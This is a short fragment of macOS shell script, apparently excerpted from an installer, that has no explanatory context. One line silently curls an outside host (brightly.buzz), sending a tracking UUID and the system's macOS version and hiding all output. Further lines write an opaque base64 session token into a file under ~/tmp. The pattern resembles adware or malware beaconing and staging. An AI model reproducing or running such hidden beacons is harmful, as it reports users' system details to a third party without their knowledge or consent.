...
curl -s "https://brightly.buzz/post_info?uuid=0a457787-a535-41b2-ae56-ae35ac413f1d&os=$(/usr/bin/sw_vers -productVersion)" > /dev/null 2>&1
...
cd ~/tmp
echo SESSION=Zwres5kBqMrLvb50a72SaESjT4eFy7MX3/hVuBCVj4zuJVaGUA9KPzk5LdsJ+9OVuucToQA4pwvW7f7iZ41+Xg== > context
